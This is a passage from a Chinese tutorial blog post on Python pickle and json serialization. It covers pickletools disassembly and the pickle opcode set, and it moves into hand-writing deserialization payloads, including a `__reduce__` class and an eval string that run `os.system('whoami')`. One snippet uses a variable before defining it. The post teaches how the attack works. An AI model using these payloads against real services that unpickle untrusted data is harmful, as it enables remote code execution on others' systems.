#b&#x27;\\x80\\x03c__main__\\nPerson\\nq\\x00.&#x27;</span><br><span class=\"line\">per2 = pickle.loads(per)</span><br><span class=\"line\">print(per2)   #&lt;class &#x27;__main__.Person&#x27;&gt;</span><br></pre></td></tr></table></figure>\n<p>如果用 json 对 Person 实例对象进行序列化，就会报错：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import json</span><br><span class=\"line\">p = Person(&#x27;张三&#x27; , 30 , False)</span><br><span class=\"line\">json.dumps(p)</span><br><span class=\"line\">Traceback (most recent call last):</span><br><span class=\"line\">File &quot;&lt;pyshell#49&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class=\"line\">json.dumps(p)</span><br><span class=\"line\">……</span><br><span class=\"line\">TypeError: Object of type &#x27;Person&#x27; is not JSON serializable</span><br></pre></td></tr></table></figure>\n<p><strong>如果非要用 json 对 Person 对象进行序列化，必须先定义一个将 Person 对象转化为字典（dict) 的方法</strong>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def person2dict(per):</span><br><span class=\"line\">    return &#123;</span><br><span class=\"line\">    &#x27;name&#x27;:per.name ,</span><br><span class=\"line\">    &#x27;age&#x27;:per.age ,</span><br><span class=\"line\">    &#x27;isMarried&#x27;:per.isMarried</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">p3 = json.dumps(p , default=person2dict)</span><br><span class=\"line\">type(p3)    #&lt;class &#x27;str&#x27;&gt;</span><br><span class=\"line\">print(p3)   # &#x27;&#123;&quot;name&quot;: &quot;\\\\u5f20\\\\u4e09&quot;, &quot;age&quot;: 30, &quot;isMarried&quot;: false&#125;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">p3 = json.dumps(p , default=person2dict , ensure_ascii=False)</span><br><span class=\"line\">type(p3)   #&lt;class &#x27;str&#x27;&gt;</span><br><span class=\"line\">print(p3)  # &#x27;&#123;&quot;name&quot;: &quot;张三&quot;, &quot;age&quot;: 30, &quot;isMarried&quot;: false&#125;&#x27;</span><br></pre></td></tr></table></figure>\n<p>当然，也不能直接进行反序列化，不然也只会得到一个字典：</p>\n<p>此时，也要定义一个将字典转换为 Person 类实例的方法，在进行反序列化：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def dict2person(d):</span><br><span class=\"line\">\treturn Person(d[&#x27;name&#x27;],d[&#x27;age&#x27;],d[&#x27;isMarried&#x27;])</span><br><span class=\"line\">p5 = json.loads(p3 , object_hook=dict2person)</span><br><span class=\"line\">type(p5)         #&lt;class &#x27;__main__.Person&#x27;&gt;</span><br><span class=\"line\">print(p5.name)   #&#x27;张三&#x27;</span><br></pre></td></tr></table></figure>\n<p><strong>（2）pickle 序列化结果为 bites 类型，只适合于 Python 机器之间的交互。</strong></p>\n<p><strong>json 序列化结果为 str 类型，能够被多种语言识别，可用于与其他程序设计语言交互。</strong></p>\n<p><strong>JSON 和 Python 内置的数据类型对应如下：</strong></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">JSON 类型</th>\n<th style=\"text-align:left\">Python 类型</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">{}</td>\n<td style=\"text-align:left\">dict</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">[]</td>\n<td style=\"text-align:left\">list</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">“string”</td>\n<td style=\"text-align:left\">‘str’或 u’unicode’</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">1234.56</td>\n<td style=\"text-align:left\">int 或 float</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">true/false</td>\n<td style=\"text-align:left\">True/False</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">null</td>\n<td style=\"text-align:left\">None</td>\n</tr>\n</tbody>\n</table>\n<blockquote>\n<p><strong>（1）序列化与反序列化是为了解决内存中对象的持久化与传输问题；</strong></p>\n<p><strong>（2）Python 中提供了 pickle 和 json 两个模块进行序列化与反序列化；</strong></p>\n<p><strong>（3）dumps () 和 dump () 用于序列化，loads () 和 load () 用于反序列化；</strong></p>\n<p><strong>（4）pickle 模块能序列化任何对象，序列化结果为 bites 类型，只适合于 Python 机器之间交互；</strong></p>\n<p><strong>json 模块只能序列化 Python 基本类型，序列化结果为 json 格式字符串，适合不同开发语言之间交互。</strong></p>\n</blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNTc1Njgx\">https://cloud.tencent.com/developer/article/1575681</span></p>\n<h3 id=\"反序列化流程分析\"><a class=\"markdownIt-Anchor\" href=\"#反序列化流程分析\">#</a> 反序列化流程分析</h3>\n<p>直接分析反序列化出的字符串是比较困难的，我们可以使用 <code>pickletools</code>  帮助我们进行分析</p>\n<p>pickletools 是 python 自带的 pickle 调试器，有三个功能：<strong>反汇编</strong>一个已经被打包的字符串、<strong>优化</strong>一个已经被打包的字符串、返回一个迭代器来供程序使用。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import pickletools</span><br><span class=\"line\">import pickle</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">a_list = [&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">a_list_pickle = pickle.dumps(a_list,protocol=0)</span><br><span class=\"line\">print(a_list_pickle)</span><br><span class=\"line\">print(&#x27;------------------&#x27;)</span><br><span class=\"line\"># 优化一个已经被打包的字符串</span><br><span class=\"line\">a_list_pickle = pickletools.optimize(a_list_pickle)</span><br><span class=\"line\">print(a_list_pickle)</span><br><span class=\"line\">print(&#x27;------------------&#x27;)</span><br><span class=\"line\"># 反汇编一个已经被打包的字符串</span><br><span class=\"line\">pickletools.dis(a_list_pickle)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">b&#x27;(lp0\\nVa\\np1\\naVb\\np2\\naVc\\np3\\na.&#x27;</span><br><span class=\"line\">------------------</span><br><span class=\"line\">b&#x27;(lVa\\naVb\\naVc\\na.&#x27;</span><br><span class=\"line\">------------------</span><br><span class=\"line\">    0: (    MARK</span><br><span class=\"line\">    1: l        LIST       (MARK at 0)</span><br><span class=\"line\">    2: V    UNICODE    &#x27;a&#x27;</span><br><span class=\"line\">    5: a    APPEND</span><br><span class=\"line\">    6: V    UNICODE    &#x27;b&#x27;</span><br><span class=\"line\">    9: a    APPEND</span><br><span class=\"line\">   10: V    UNICODE    &#x27;c&#x27;</span><br><span class=\"line\">   13: a    APPEND</span><br><span class=\"line\">   14: .    STOP</span><br><span class=\"line\">highest protocol among opcodes = 0</span><br></pre></td></tr></table></figure>\n<p>pickletools 指令集</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MARK           = b&#x27;(&#x27;   # push special markobject on stack</span><br><span class=\"line\">STOP           = b&#x27;.&#x27;   # every pickle ends with STOP</span><br><span class=\"line\">POP            = b&#x27;0&#x27;   # discard topmost stack item</span><br><span class=\"line\">POP_MARK       = b&#x27;1&#x27;   # discard stack top through topmost markobject</span><br><span class=\"line\">DUP            = b&#x27;2&#x27;   # duplicate top stack item</span><br><span class=\"line\">FLOAT          = b&#x27;F&#x27;   # push float object; decimal string argument</span><br><span class=\"line\">INT            = b&#x27;I&#x27;   # push integer or bool; decimal string argument</span><br><span class=\"line\">BININT         = b&#x27;J&#x27;   # push four-byte signed int</span><br><span class=\"line\">BININT1        = b&#x27;K&#x27;   # push 1-byte unsigned int</span><br><span class=\"line\">LONG           = b&#x27;L&#x27;   # push long; decimal string argument</span><br><span class=\"line\">BININT2        = b&#x27;M&#x27;   # push 2-byte unsigned int</span><br><span class=\"line\">NONE           = b&#x27;N&#x27;   # push None</span><br><span class=\"line\">PERSID         = b&#x27;P&#x27;   # push persistent object; id is taken from string arg</span><br><span class=\"line\">BINPERSID      = b&#x27;Q&#x27;   #  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack</span><br><span class=\"line\">REDUCE         = b&#x27;R&#x27;   # apply callable to argtuple, both on stack</span><br><span class=\"line\">STRING         = b&#x27;S&#x27;   # push string; NL-terminated string argument</span><br><span class=\"line\">BINSTRING      = b&#x27;T&#x27;   # push string; counted binary string argument</span><br><span class=\"line\">SHORT_BINSTRING= b&#x27;U&#x27;   #  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span><br><span class=\"line\">UNICODE        = b&#x27;V&#x27;   # push Unicode string; raw-unicode-escaped&#x27;d argument</span><br><span class=\"line\">BINUNICODE     = b&#x27;X&#x27;   #   &quot;     &quot;       &quot;  ; counted UTF-8 string argument</span><br><span class=\"line\">APPEND         = b&#x27;a&#x27;   # append stack top to list below it</span><br><span class=\"line\">BUILD          = b&#x27;b&#x27;   # call __setstate__ or __dict__.update()</span><br><span class=\"line\">GLOBAL         = b&#x27;c&#x27;   # push self.find_class(modname, name); 2 string args</span><br><span class=\"line\">DICT           = b&#x27;d&#x27;   # build a dict from stack items</span><br><span class=\"line\">EMPTY_DICT     = b&#x27;&#125;&#x27;   # push empty dict</span><br><span class=\"line\">APPENDS        = b&#x27;e&#x27;   # extend list on stack by topmost stack slice</span><br><span class=\"line\">GET            = b&#x27;g&#x27;   # push item from memo on stack; index is string arg</span><br><span class=\"line\">BINGET         = b&#x27;h&#x27;   #   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg</span><br><span class=\"line\">INST           = b&#x27;i&#x27;   # build &amp; push class instance</span><br><span class=\"line\">LONG_BINGET    = b&#x27;j&#x27;   # push item from memo on stack; index is 4-byte arg</span><br><span class=\"line\">LIST           = b&#x27;l&#x27;   # build list from topmost stack items</span><br><span class=\"line\">EMPTY_LIST     = b&#x27;]&#x27;   # push empty list</span><br><span class=\"line\">OBJ            = b&#x27;o&#x27;   # build &amp; push class instance</span><br><span class=\"line\">PUT            = b&#x27;p&#x27;   # store stack top in memo; index is string arg</span><br><span class=\"line\">BINPUT         = b&#x27;q&#x27;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg</span><br><span class=\"line\">LONG_BINPUT    = b&#x27;r&#x27;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg</span><br><span class=\"line\">SETITEM        = b&#x27;s&#x27;   # add key+value pair to dict</span><br><span class=\"line\">TUPLE          = b&#x27;t&#x27;   # build tuple from topmost stack items</span><br><span class=\"line\">EMPTY_TUPLE    = b&#x27;)&#x27;   # push empty tuple</span><br><span class=\"line\">SETITEMS       = b&#x27;u&#x27;   # modify dict by adding topmost key+value pairs</span><br><span class=\"line\">BINFLOAT       = b&#x27;G&#x27;   # push float; arg is 8-byte float encoding</span><br><span class=\"line\">TRUE           = b&#x27;I01\\n&#x27;  # not an opcode; see INT docs in pickletools.py</span><br><span class=\"line\">FALSE          = b&#x27;I00\\n&#x27;  # not an opcode; see INT docs in pickletools.py</span><br></pre></td></tr></table></figure>\n<p>将上面的输出对照翻译</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">b&#x27;\\x80\\x03](X\\x01\\x00\\x00\\x00aX\\x01\\x00\\x00\\x00bX\\x01\\x00\\x00\\x00ce.&#x27;</span><br><span class=\"line\">    0: \\x80 PROTO      3\t#标明使用协议版本</span><br><span class=\"line\">    2: ]    EMPTY_LIST\t#将空列表压入栈</span><br><span class=\"line\">    3: (    MARK\t#将标志压入栈</span><br><span class=\"line\">    4: X        BINUNICODE &#x27;a&#x27;\t#unicode字符</span><br><span class=\"line\">   10: X        BINUNICODE &#x27;b&#x27;</span><br><span class=\"line\">   16: X        BINUNICODE &#x27;c&#x27;</span><br><span class=\"line\">   22: e        APPENDS    (MARK at 3)\t#将3号标志后的数据压入列表</span><br><span class=\"line\">   # 弹出栈中的数据，结束流程</span><br><span class=\"line\">   23: .    STOP</span><br><span class=\"line\">highest protocol among opcodes = 2</span><br></pre></td></tr></table></figure>\n<p>我们再来看另一个更复杂的例子</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import pickle</span><br><span class=\"line\">import pickletools</span><br><span class=\"line\">import base64</span><br><span class=\"line\"></span><br><span class=\"line\">class a_class():</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        self.age = 114514</span><br><span class=\"line\">        self.name = &quot;QAQ&quot;</span><br><span class=\"line\">        self.list = [&quot;1919&quot;,&quot;810&quot;,&quot;qwq&quot;]</span><br><span class=\"line\">a_class_new = a_class()</span><br><span class=\"line\">a_class_pickle = pickle.dumps(a_class_new,protocol=3)</span><br><span class=\"line\">print(a_class_pickle)</span><br><span class=\"line\"># 优化一个已经被打包的字符串</span><br><span class=\"line\">a_list_pickle = pickletools.optimize(a_class_pickle)</span><br><span class=\"line\">print(a_class_pickle)</span><br><span class=\"line\"># 反汇编一个已经被打包的字符串</span><br><span class=\"line\">pickletools.dis(a_class_pickle)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">b&#x27;\\x80\\x03c__main__\\na_class\\nq\\x00)\\x81q\\x01&#125;q\\x02(X\\x03\\x00\\x00\\x00ageq\\x03JR\\xbf\\x01\\x00X\\x04\\x00\\x00\\x00nameq\\x04X\\x03\\x00\\x00\\x00QAQq\\x05X\\x04\\x00\\x00\\x00listq\\x06]q\\x07(X\\x04\\x00\\x00\\x001919q\\x08X\\x03\\x00\\x00\\x00810q\\tX\\x03\\x00\\x00\\x00qwqq\\neub.&#x27;</span><br><span class=\"line\">b&#x27;\\x80\\x03c__main__\\na_class\\nq\\x00)\\x81q\\x01&#125;q\\x02(X\\x03\\x00\\x00\\x00ageq\\x03JR\\xbf\\x01\\x00X\\x04\\x00\\x00\\x00nameq\\x04X\\x03\\x00\\x00\\x00QAQq\\x05X\\x04\\x00\\x00\\x00listq\\x06]q\\x07(X\\x04\\x00\\x00\\x001919q\\x08X\\x03\\x00\\x00\\x00810q\\tX\\x03\\x00\\x00\\x00qwqq\\neub.&#x27;</span><br><span class=\"line\">    0: \\x80 PROTO      3</span><br><span class=\"line\">    # push self.find_class(modname, name); 连续读取两个字符串作为参数，以\\n为界</span><br><span class=\"line\">    # 这里就是self.find_class(‘__main__’, ‘a_class’);</span><br><span class=\"line\">    # 需要注意的版本不同，find_class函数也不同</span><br><span class=\"line\">    2: c    GLOBAL     &#x27;__main__ a_class&#x27;\t</span><br><span class=\"line\">    # 不影响反序列化</span><br><span class=\"line\">   20: q    BINPUT     0</span><br><span class=\"line\">   # 向栈中压入一个元组</span><br><span class=\"line\">   22: )    EMPTY_TUPLE</span><br><span class=\"line\">   # 见pickletools源码第2097行（注意版本）</span><br><span class=\"line\">   # 大意为，该指令之前的栈内容应该为一个类（2行GLOBAL创建的类），类后为一个元组（22行压入的TUPLE），调用cls.__new__(cls, *args)（即用元组中的参数创建一个实例，这里元组实际为空）</span><br><span class=\"line\">   23: \\x81 NEWOBJ</span><br><span class=\"line\">   24: q    BINPUT     1</span><br><span class=\"line\">   # 压入一个新的字典</span><br><span class=\"line\">   26: &#125;    EMPTY_DICT</span><br><span class=\"line\">   27: q    BINPUT     2</span><br><span class=\"line\">   # 一个标志</span><br><span class=\"line\">   29: (    MARK</span><br><span class=\"line\">   # 压入unicode值</span><br><span class=\"line\">   30: X        BINUNICODE &#x27;age&#x27;</span><br><span class=\"line\">   38: q        BINPUT     3</span><br><span class=\"line\">   40: J        BININT     114514</span><br><span class=\"line\">   45: X        BINUNICODE &#x27;name&#x27;</span><br><span class=\"line\">   54: q        BINPUT     4</span><br><span class=\"line\">   56: X        BINUNICODE &#x27;QAQ&#x27;</span><br><span class=\"line\">   64: q        BINPUT     5</span><br><span class=\"line\">   66: X        BINUNICODE &#x27;list&#x27;</span><br><span class=\"line\">   75: q        BINPUT     6</span><br><span class=\"line\">   77: ]        EMPTY_LIST</span><br><span class=\"line\">   78: q        BINPUT     7</span><br><span class=\"line\">   # 又一个标志</span><br><span class=\"line\">   80: (        MARK</span><br><span class=\"line\">   81: X            BINUNICODE &#x27;1919&#x27;</span><br><span class=\"line\">   90: q            BINPUT     8</span><br><span class=\"line\">   92: X            BINUNICODE &#x27;810&#x27;</span><br><span class=\"line\">  100: q            BINPUT     9</span><br><span class=\"line\">  102: X            BINUNICODE &#x27;qwq&#x27;</span><br><span class=\"line\">  110: q            BINPUT     10</span><br><span class=\"line\">  # 将第80行的mark之后的值压入第77行的列表</span><br><span class=\"line\">  112: e            APPENDS    (MARK at 80)</span><br><span class=\"line\">  # 详情见pickletools源码第1674行（注意版本）</span><br><span class=\"line\">  # 大意为将任意数量的键值对添加到现有字典中</span><br><span class=\"line\">  # Stack before:  ... pydict markobject key_1 value_1 ... key_n value_n</span><br><span class=\"line\">  # Stack after:   ... pydict</span><br><span class=\"line\">  113: u        SETITEMS   (MARK at 29)</span><br><span class=\"line\">  # 通过__setstate__或更新__dict__完成构建对象（对象为我们在23行创建的）。</span><br><span class=\"line\">  # 如果对象具有__setstate__方法，则调用anyobject .__setstate__（参数）</span><br><span class=\"line\">  # 如果无__setstate__方法，则通过anyobject.__dict__.update(argument)更新值</span><br><span class=\"line\">  # 注意这里可能会产生变量覆盖</span><br><span class=\"line\">  114: b    BUILD</span><br><span class=\"line\">  # 弹出栈中的数据，结束流程</span><br><span class=\"line\">  115: .    STOP</span><br><span class=\"line\">highest protocol among opcodes = 2</span><br></pre></td></tr></table></figure>\n<h3 id=\"手写opcode\"><a class=\"markdownIt-Anchor\" href=\"#手写opcode\">#</a> 手写 opcode</h3>\n<p>假设我们想执行如下命令，在内建函数中引用形式如下，如果有一个黑名单禁用 <code>eval</code> ，那么利用 <code>__reduce__</code> 就不能使用了。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">builtins.getattr(builtins, &#x27;eval&#x27;),(&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;,)</span><br></pre></td></tr></table></figure>\n<p>但是在 <code>__reduce__</code> 生成的序列化字符串，只能执行一个函数，而且在对 open 传参的过程中，程序会报错。</p>\n<p>不能正常生成序列化字符串，这就需要手写一个序列化字符串。</p>\n<p>一些常见的 code</p>\n<blockquote>\n<ul>\n<li><code>c</code> ：以 c 开始的后面两行的作用类似 <code>os.system</code>  的调用，其中 <code>cos</code>  在第一行， <code>system</code>  在第二行。</li>\n<li><code>(</code> ：相当于左括号</li>\n<li><code>t</code> ：相当于右括号</li>\n<li><code>S</code> ：表示本行的内容一个字符串</li>\n<li><code>R</code> ：执行紧靠自己左边的一个括号对（即 <code>(</code>  和 <code>t</code>  之间）的内容</li>\n<li><code>.</code> ：代表该 pickle 结束</li>\n</ul>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\">import pickletools</span><br><span class=\"line\">import pickle</span><br><span class=\"line\">class Student():</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        self.name = &#x27;secret.name&#x27;</span><br><span class=\"line\">        self.grade = &#x27;secret.grade&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    # def __reduce__(self):</span><br><span class=\"line\">    #     return (os.system,(&#x27;dir&#x27;,))</span><br><span class=\"line\"></span><br><span class=\"line\">payload = pickle.dumps(Student(),protocol=0)</span><br><span class=\"line\">print(payload)</span><br><span class=\"line\">print(&quot;--------------&quot;)</span><br><span class=\"line\">payload = pickletools.optimize(payload)</span><br><span class=\"line\">print(payload)</span><br><span class=\"line\">print(&quot;--------------&quot;)</span><br><span class=\"line\">pickletools.dis(payload)</span><br><span class=\"line\">print(&quot;--------------&quot;)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">b&#x27;ccopy_reg\\n_reconstructor\\np0\\n(c__main__\\nStudent\\np1\\nc__builtin__\\nobject\\np2\\nNtp3\\nRp4\\n(dp5\\nVname\\np6\\nVsecret.name\\np7\\nsVgrade\\np8\\nVsecret.grade\\np9\\nsb.&#x27;</span><br><span class=\"line\">--------------</span><br><span class=\"line\">b&#x27;ccopy_reg\\n_reconstructor\\n(c__main__\\nStudent\\nc__builtin__\\nobject\\nNtR(dVname\\nVsecret.name\\nsVgrade\\nVsecret.grade\\nsb.&#x27;</span><br><span class=\"line\">--------------</span><br><span class=\"line\">    0: c    GLOBAL     &#x27;copy_reg _reconstructor&#x27;</span><br><span class=\"line\">   25: (    MARK</span><br><span class=\"line\">   26: c        GLOBAL     &#x27;__main__ Student&#x27;</span><br><span class=\"line\">   44: c        GLOBAL     &#x27;__builtin__ object&#x27;</span><br><span class=\"line\">   64: N        NONE</span><br><span class=\"line\">   65: t        TUPLE      (MARK at 25)</span><br><span class=\"line\">   66: R    REDUCE</span><br><span class=\"line\">   67: (    MARK</span><br><span class=\"line\">   68: d        DICT       (MARK at 67)</span><br><span class=\"line\">   69: V    UNICODE    &#x27;name&#x27;</span><br><span class=\"line\">   75: V    UNICODE    &#x27;secret.name&#x27;</span><br><span class=\"line\">   88: s    SETITEM</span><br><span class=\"line\">   89: V    UNICODE    &#x27;grade&#x27;</span><br><span class=\"line\">   96: V    UNICODE    &#x27;secret.grade&#x27;</span><br><span class=\"line\">  110: s    SETITEM</span><br><span class=\"line\">  111: b    BUILD</span><br><span class=\"line\">  112: .    STOP</span><br><span class=\"line\">highest protocol among opcodes = 0</span><br><span class=\"line\">--------------</span><br></pre></td></tr></table></figure>\n<p>再举个例子</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import pickle</span><br><span class=\"line\">import os</span><br><span class=\"line\">import pickletools</span><br><span class=\"line\">class exp(object):</span><br><span class=\"line\">    def __reduce__(self):</span><br><span class=\"line\">        return (os.system,(&#x27;whoami&#x27;,))</span><br><span class=\"line\">e = exp()</span><br><span class=\"line\">print(s)</span><br><span class=\"line\">s = pickle.dumps(e,protocol=0)</span><br><span class=\"line\">pickletools.dis(s)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span 